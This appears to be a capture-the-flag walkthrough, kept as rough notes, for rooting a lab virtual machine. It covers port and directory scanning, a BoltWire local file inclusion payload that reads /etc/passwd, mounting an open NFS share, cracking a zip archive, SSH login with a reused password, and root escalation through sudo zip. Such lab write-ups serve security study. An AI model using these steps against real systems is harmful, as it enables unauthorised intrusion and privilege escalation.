@@ -1,0 +1,168 @@
+Linux dev 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x84_64 GNU/Linux
+
+Linux DEV
+    nmap -A -T4 -p- 192.168.57.8
+        Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-05 11:27 EDT
+        Nmap scan report for 192.168.57.8
+        Host is up (0.00061s latency).
+        Not shown: 65526 closed tcp ports (reset)
+        PORT      STATE SERVICE  VERSION
+        22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+        | ssh-hostkey:
+        |   2048 bd:96:ec:08:2f:b1:ea:06:ca:fc:46:8a:7e:8a:e3:55 (RSA)
+        |   256 56:32:3b:9f:48:2d:e0:7e:1b:df:20:f8:03:60:56:5e (ECDSA)
+        |_  256 95:dd:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)
+        80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
+        |_http-server-header: Apache/2.4.38 (Debian)
+        |_http-title: Bolt - Installation error
+        111/tcp   open  rpcbind  2-4 (RPC #100000)
+        | rpcinfo:
+        |   program version    port/proto  service
+        |   100000  2,3,4        111/tcp   rpcbind
+        |   100000  2,3,4        111/udp   rpcbind
+        |   100000  3,4          111/tcp6  rpcbind
+        |   100000  3,4          111/udp6  rpcbind
+        |   100003  3           2049/udp   nfs
+        |   100003  3           2049/udp6  nfs
+        |   100003  3,4         2049/tcp   nfs
+        |   100003  3,4         2049/tcp6  nfs
+        |   100005  1,2,3      48181/tcp6  mountd
+        |   100005  1,2,3      52366/udp6  mountd
+        |   100005  1,2,3      55497/tcp   mountd
+        |   100005  1,2,3      56579/udp   mountd
+        |   100021  1,3,4      33799/tcp6  nlockmgr
+        |   100021  1,3,4      44279/tcp   nlockmgr
+        |   100021  1,3,4      52197/udp6  nlockmgr
+        |   100021  1,3,4      60812/udp   nlockmgr
+        |   100227  3           2049/tcp   nfs_acl
+        |   100227  3           2049/tcp6  nfs_acl
+        |   100227  3           2049/udp   nfs_acl
+        |_  100227  3           2049/udp6  nfs_acl
+        2049/tcp  open  nfs_acl  3 (RPC #100227)
+        8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))
+        |_http-server-header: Apache/2.4.38 (Debian)
+        | http-open-proxy: Potentially OPEN proxy.
+        |_Methods supported:CONNECTION
+        |_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
+        44279/tcp open  nlockmgr 1-4 (RPC #100021)
+        44921/tcp open  mountd   1-3 (RPC #100005)
+        55497/tcp open  mountd   1-3 (RPC #100005)
+        58347/tcp open  mountd   1-3 (RPC #100005)
+        MAC Address: 08:00:27:90:01:B9 (Oracle VirtualBox virtual NIC)
+        Device type: general purpose
+        Running: Linux 4.X|5.X
+        OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+        OS details: Linux 4.15 - 5.6
+        Network Distance: 1 hop
+        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.57.8/FUZZ
+
+    http://192.168.57.8/app/config/
+        config.yml
+            username: bolt
+            password: I_love_java
+
+    ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.57.8:8080/FUZZ
+
+    http://192.168.57.8:8080/dev/
+
+    searchsploit boltwire
+        ---------------------------------------------------------------------------- ---------------------------------
+         Exploit Title                                                              |  Path
+        ---------------------------------------------------------------------------- ---------------------------------
+        BoltWire 3.4.16 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities | php/webapps/36552.txt
+        BoltWire 6.03 - Local File Inclusion                                        | php/webapps/48411.txt
+        ---------------------------------------------------------------------------- ---------------------------------
+        Shellcodes: No Results
+
+
+    Pesquisar: boltwire exploit
+        (https://www.exploit-db.com/exploits/48411)
+        http://192.168.57.8:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd
+
+        jeanPaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash
+
+
+    showmount -e 192.168.57.8
+        Export list for 192.168.57.8:
+        /srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16
+
+    mkdir /mnt/dev
+
+    mount -t nfs 192.168.57.8:/srv/nfs /mnt/dev
+
+    cd /mnt/dev
+
+    ls
+        save.zip
+
+    unzip save.zip
+        Archive:  save.zip
+        [save.zip] id_rsa password:
+
+    apt install fcrackzip
+
+    fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
+        found file 'id_rsa', (size cp/uc   1435/  1876, flags 9, chk 2a0d)
+        found file 'todo.txt', (size cp/uc    138/   164, flags 9, chk 2aa1)
+
+        PASSWORD FOUND!!!!: pw == java101
+
+    unzip save.zip
+
+    cat todo.txt
+        - Figure out how to install the main website properly, the config file seems correct...
+        - Update development website
+        - Keep coding in Java because it's awesome
+
+        jp
+
+    cat id_rsa
+        -----BEGIN OPENSSH PRIVATE KEY-----
+        b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDVFCI+ea
+        0xYnmZX4CmL9ZbAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQC/kR5x49E4
+        0gkpiTPjvLVnuS3POptOks9qC3uiacuyX33vQBHcJ+vEFzkbkgvtO3RRQodNTfTEB181Pj
+        3AyGSJeQu6omZha8fVHh/y2ZMRjAWRs
+
+    ssh -i id_rsa jp@192.168.57.8
+        The authenticity of host '192.168.57.8 (192.168.57.8)' can't be established.
+        ED25519 key fingerprint is SHA256:NHMY4yX3pvvY0+B19v9tKZ+FdH9JOewJJKnKy2B0tW8.
+        This key is not known by any other names
+        Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+        Warning: Permanently added '192.168.57.8' (ED25519) to the list of known hosts.
+        jp@192.168.57.8's password:
+
+    ssh -i id_rsa jeanpaul@192.168.57.8
+        Warning: Identity file id_rsa not accessible: No such file or directory.
+        jeanpaul@192.168.57.8's password: 'I_love_java'
+
+    jeanpaul@dev:~$ sudo -l
+    jeanpaul@dev:~$sudo zip
+
+    pesquisar: gtfobins
+
+    https://gtfobins.github.io/
+        https://gtfobins.github.io/gtfobins/zip/
+        Sudo
+        Se o binário tiver permissão para ser executado como superusuário por sudo, ele não descartará os
+         privilégios elevados e poderá ser usado para acessar o sistema de arquivos, escalar ou manter acesso
+         privilegiado.
+
+        TF=$(mktemp -u)
+        sudo zip $TF /etc/hosts -T -TT 'sh #'
+        sudo rm $TF
+
+
+    jeanpaul@dev:~$ TF=$(mktemp -u)
+    jeanpaul@dev:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
+
+    #id
+    #cd /root
+        flag.txt
+    #cat flag.txt
+    Congratz on rooting this box !
+
+
+
+
